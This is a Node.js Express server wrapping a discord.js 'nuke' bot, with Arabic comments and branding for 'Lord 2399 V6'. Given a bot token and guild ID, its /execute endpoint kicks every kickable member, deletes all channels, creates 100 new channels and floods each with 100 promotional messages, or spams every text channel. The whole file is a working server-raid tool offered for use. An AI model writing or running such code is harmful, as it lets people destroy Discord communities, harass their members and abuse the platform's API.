const { Client, GatewayIntentBits, ChannelType, PermissionFlagsBits } = require('discord.js');
const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.post('/execute', async (req, res) => {
    const { token, guildId, action, customName, customMsg } = req.body;
    
    // رد فوري للمتصفح لمنع "خطأ الاتصال"
    res.status(200).send({ status: '🚀 تم إطلاق الهجوم V6 في الخلفية!' });

    const client = new Client({ 
        intents: [3276799] // All Intents
    });

    try {
        await client.login(token);
        const guild = await client.guilds.fetch(guildId).catch(() => null);
        if (!guild) return client.destroy();

        const name = customName || "Lord 2399 V6";
        const msg = customMsg || "# LORD 2399 V6 ON TOP\nhttps://discord.gg/2399k";

        // طرد الجميع
        if (action === 'تدمير' || action === 'طرد') {
            const members = await guild.members.fetch();
            members.forEach(m => {
                if (m.kickable) m.kick('Lord Power').catch(() => {});
            });
        }

        // تدمير شامل (أقصى سرعة API)
        if (action === 'تدمير') {
            // حذف القنوات
            const channels = await guild.channels.fetch();
            channels.forEach(ch => ch.delete().catch(() => {}));

            // إنشاء 100 قناة دفعة واحدة
            for (let i = 0; i < 100; i++) {
                setTimeout(() => {
                    guild.channels.create({ name: name, type: ChannelType.GuildText })
                    .then(ch => {
                        // سبام مكثف (100 رسالة لكل قناة)
                        for(let j=0; j<100; j++) ch.send(msg).catch(() => {});
                    }).catch(() => {});
                }, i * 20); 
            }
        }

        if (action === 'سبام') {
            guild.channels.cache.forEach(ch => {
                if(ch.type === ChannelType.GuildText) {
                    for(let i=0; i<50; i++) ch.send(msg).catch(() => {});
                }
            });
        }
    } catch (err) {
        console.log("Error in Bot:", err.message);
    }
});

app.listen(process.env.PORT || 3000, '0.0.0.0');
